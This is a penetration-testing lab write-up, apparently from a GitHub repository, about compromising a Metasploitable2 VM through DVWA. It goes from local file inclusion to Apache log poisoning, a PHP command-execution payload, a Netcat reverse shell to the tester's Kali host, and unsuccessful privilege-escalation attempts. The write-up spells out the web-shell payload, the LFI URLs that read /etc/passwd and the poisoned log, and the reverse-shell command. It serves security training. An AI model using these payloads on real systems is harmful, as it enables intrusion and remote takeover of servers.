---

# Lab09 – Remote Command Execution (RCE) via Apache Log Poisoning

##  Description

In this lab, we exploited a **Local File Inclusion (LFI)** vulnerability to achieve **Remote Command Execution (RCE)** using **Apache log poisoning**. We established a **reverse shell** using Netcat and attempted multiple **privilege escalation** techniques via `SUID binaries`, `nmap`, `chsh`, and `cron jobs`. Although we didn’t achieve root access, we successfully gained deep system interaction and learned a lot about real-world privilege escalation obstacles.

---

##  Target System

- **VM**: Metasploitable2
- **Kernel**: Linux 2.6.24-16-server i686
- **IP Address**: `192.168.56.103`

---

## Exploitation Steps

### 1. Information Gathering

- Discovered LFI vulnerability in DVWA:

http://192.168.56.103/dvwa/vulnerabilities/fi/?page=.../etc/passwd

### 2. Apache Log Poisoning

- Injected payload via `User-Agent` using curl:
```bash
curl -A "<?php system($_GET['cmd']); ?>" http://192.168.56.103

Accessed poisoned log file using LFI:

http://192.168.56.103/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=id
```

### 3.  Remote Command Execution

Executed system commands through cmd= parameter:

http://192.168.56.103/html/shell.php?cmd=whoami


### 4.  Reverse Shell with Netcat

Listener on Kali:

nc -lvnp 4444

Triggered reverse shell via:

http://192.168.56.103/html/shell.php?cmd=nc -e /bin/bash 192.168.56.102 4444


### 5.  Shell Stabilization

Upgraded to interactive shell:

python -c 'import pty; pty.spawn("/bin/bash")'



---

## Privilege Escalation Attempts

Method	Result	Notes

SUID /usr/bin/chsh	-> Permission denied	No shell switch
SUID /usr/bin/nmap	-> No interactive mode	Only version 4.53
Cronjob abuse	-> No writable scripts	No exploitable path
find writable files	-> Not useful	No execution or cron abuse path


Despite creative attempts using pty, nmap, shell.php, and find, no working LPE path was identified without importing a kernel exploit binary.


---

## Screenshots

1. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-11%20at%2019.11.00.png)

2. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-11%20at%2023.08.05.png)

3. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-12%20at%2020.01.50.png)

4. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-12%20at%2020.14.53.png)

5. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-12%20at%2020.15.06.png)

6. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-12%20at%2020.37.21.png)

7. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-12%20at%2020.46.23.png)

8. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-13%20at%2001.25.26.png)

9. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-13%20at%2002.12.24.png)

10. ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab09/Screen%20Shot%202025-06-13%20at%2002.14.57.png)


---

## What I Learned

How LFI can lead to RCE via Apache log poisoning.

Creating and triggering a reverse shell from a PHP payload.

Common privilege escalation paths using SUID binaries, cron, and environment variables.

Realized that not every target leads to root without kernel-level exploits.

The importance of exploration, enumeration, and patience.



---

## Limitations

Could not achieve root due to:

No writable cron scripts.

No interactive nmap shell.

SUID binaries not vulnerable.




---

## Lab Status

[x] Gained RCE

[x] Achieved reverse shell

[x] Performed enumeration and privesc attempts

[ ] Root access (not achieved)
